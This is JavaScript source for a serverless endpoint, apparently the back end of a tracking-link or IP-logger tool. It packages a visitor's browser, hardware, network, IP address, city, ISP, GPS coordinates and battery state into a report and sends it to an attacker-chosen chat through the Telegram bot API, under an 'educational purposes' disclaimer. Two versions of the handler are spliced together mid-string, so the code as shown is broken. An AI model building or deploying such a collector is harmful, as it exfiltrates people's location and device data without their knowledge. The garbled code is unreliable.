export default async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { telegramId, ...d } = req.body;

    const message = `**🔰 Device Information Report 🔰**\n\n` +
      `🌐 **Basic Info:**\n` +
      `- Browser: ${d.browser}\n` +
      `- Platform: ${d.platform}\n` +
      `- Language: ${d.language}\n` +
      `- Timezone: ${d.timezone}\n\n` +

      `💻 **Hardware:**\n` +
      `- CPU: ${d.cpu}\n` +
      `- RAM: ${d.ram}\n` +
      `- Screen: ${d.screen}\n` +export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { telegramId, location = {}, ...d } = req.body;

    if (!telegramId) {
      return res.status(400).json({ error: 'Missing telegramId' });
    }

    // Escape risky characters for Markdown
    const escapeMd = (text) =>
      String(text || "Unknown").replace(/[_*[\]()~`>#+\-=|{}.!]/g, "\\$&");

    const message =
      `**🔰 Device Information Report 🔰**\n\n` +

      `🌐 **Basic Info:**\n` +
      `- Browser: ${escapeMd(d.browser)}\n` +
      `- Platform: ${escapeMd(d.platform)}\n` +
      `- Language: ${escapeMd(d.language)}\n` +
      `- Timezone: ${escapeMd(d.timezone)}\n\n` +

      `💻 **Hardware:**\n` +
      `- CPU: ${escapeMd(d.cpu)}\n` +
      `- RAM: ${escapeMd(d.ram)}\n` +
      `- Screen: ${escapeMd(d.screen)}\n` +
      `- WebGL: ${escapeMd(d.webgl)}\n\n` +

      `📶 **Network:**\n` +
      `- Type: ${escapeMd(d.networkType)}\n` +
      `- Speed: ${escapeMd(d.networkSpeed)}\n` +
      `- Latency: ${escapeMd(d.latency)}\n` +
      `- Data Saver: ${escapeMd(d.dataSaver)}\n` +
      `- ISP: ${escapeMd(location.isp)}\n\n` +

      `📍 **IP Info:**\n` +
      `- IP: ${escapeMd(d.ip)}\n` +
      `- City: ${escapeMd(location.city)}\n` +
      `- Region: ${escapeMd(location.region)}\n` +
      `- Country: ${escapeMd(location.country)}\n` +
      `_Note: IP-based location may not be accurate._\n\n` +
      `- GPS: ${escapeMd(d.gps)}\n\n` +

      `🔋 **Battery:**\n` +
      `- Level: ${escapeMd(d.batteryLevel)}\n` +
      `- Charging: ${escapeMd(d.charging)}\n\n` +

      `⚠️ **Disclaimer:** This data is collected for educational and research purposes only. It is not intended for misuse. Accuracy of the information is not guaranteed and may vary depending on browser settings, device limitations, or VPN/proxy usage."`;

    const response = await fetch(
      `https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: telegramId,
          text: message,
          parse_mode: "MarkdownV2" // safer
        })
      }
    );

    if (!response.ok) {
      const errorText = await response.text();
      throw new Error(`Telegram API error: ${errorText}`);
    }

    res.status(200).json({ success: true });
  } catch (error) {
    console.error("Submit Error:", error);
    res.status(500).json({ error: error.message || "Failed to send to Telegram" });
  }
}
      `- WebGL: ${d.webgl}\n\n` +

      `📶 **Network:**\n` +
      `- Type: ${d.networkType}\n` +
      `- Speed: ${d.networkSpeed}\n` +
      `- Latency: ${d.latency}\n` +
      `- Data Saver: ${d.dataSaver}\n` +
      `- ISP: ${d.location.isp}\n\n` +

      `📍 **IP Info:**\n` +
      `- IP: ${d.ip}\n` +
      `- City: ${d.location.city}\n` +
      `- Region: ${d.location.region}\n` +
      `- Country: ${d.location.country}\n` +
      `- GPS: ${d.gps}\n\n` +
      `_Note: IP-based location may not be accurate._\n\n` +

      `🔋 **Battery:**\n` +
      `- Level: ${d.batteryLevel}\n` +
      `- Charging: ${d.charging}\n\n` +

      `⚠️ **Disclaimer:** This data is collected for educational and research purposes only. Accuracy is not guaranteed.`;

    // Send message to Telegram
    const response = await fetch(
      `https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: telegramId,
          text: message,
          parse_mode: 'Markdown'
        })
      }
    );

    if (!response.ok) {
      throw new Error('Failed to send message to Telegram');
    }

    res.status(200).json({ success: true });
  } catch (error) {
    console.error('Submit Error:', error);
    res.status(500).json({ error: error.message || 'Failed to send to Telegram' });
  }
};
